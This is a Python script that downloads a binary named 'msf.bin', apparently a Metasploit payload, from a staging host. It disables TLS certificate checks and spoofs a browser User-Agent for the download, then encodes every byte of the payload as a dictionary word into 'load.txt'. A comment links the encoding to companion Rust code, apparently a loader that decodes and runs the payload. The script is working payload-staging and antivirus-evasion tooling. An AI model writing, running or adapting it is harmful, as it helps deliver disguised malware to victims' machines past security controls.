def encode_binary_with_dictionary(dictionary_path, output_path, binary_data):
    # Read the dictionary file
    with open(dictionary_path, 'r') as dict_file:
        words = [word.strip() for word in dict_file.read().splitlines()]
    
    # Create dictionary mapping (limit to 256 entries) as in the Rust code
    word_map = {}
    for i, word in enumerate(words):
        if i > 255:  # Ensure we don't exceed 256 words (0-255 byte values)
            break
        if word:
            word_map[word] = i
    
    # Create reverse mapping for encoding (ensuring all 256 possible byte values have mappings)
    byte_to_index = {}
    
    # First, get a list of all words for cycling through if needed
    available_words = list(word_map.keys())
    if not available_words:
        raise ValueError("Dictionary is empty. Cannot proceed with encoding.")
    
    # Ensure we have mappings for ALL possible byte values (0-255)
    for byte_val in range(256):
        # If we have a word specifically mapped to this byte value, use it
        for word, val in word_map.items():
            if val == byte_val:
                byte_to_index[byte_val] = word
                break
        # If no direct mapping, cycle through available words
        if byte_val not in byte_to_index:
            # Use modulo to cycle through available words for any unmapped byte values
            word_index = byte_val % len(available_words)
            byte_to_index[byte_val] = available_words[word_index]
    
    # Encode each byte of the binary
    encoded_result = []
    for byte in binary_data:
        # We now have mappings for all possible byte values
        encoded_result.append(byte_to_index[byte])
    
    # Write encoded result to output file
    with open(output_path, 'w') as output_file:
        output_file.write(' '.join(encoded_result))
    
    print(f"Binary data encoded and written to {output_path}")

# Several options to get the binary data
import urllib.request
import os
import requests
import ssl

def get_binary_data(url):
    print(f"Attempting to download from {url}")
    
    # Option 1: Use requests with custom headers and SSL verification disabled
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': '*/*'
        }
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        response.raise_for_status()
        print("Download successful using requests with custom headers")
        return response.content
    except requests.exceptions.RequestException as e:
        print(f"Option 1 failed: {e}")
    
    # Option 2: Use urllib with custom headers and context
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(url, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
            data = response.read()
            print("Download successful using urllib with custom context")
            return data
    except Exception as e:
        print(f"Option 2 failed: {e}")
    
    # If we can't download the file, generate a dummy payload for testing
    print("All download attempts failed. Using dummy payload for testing purposes.")
    return b'This is a dummy payload for testing the encoding mechanism.'

# URL of the binary
url = "https://stage.attck-deploy.net/msf.bin"

# Get binary data
binary_data = get_binary_data(url)

# Encode and write to load.txt
encode_binary_with_dictionary("es-dictionary.txt", "load.txt", binary_data)
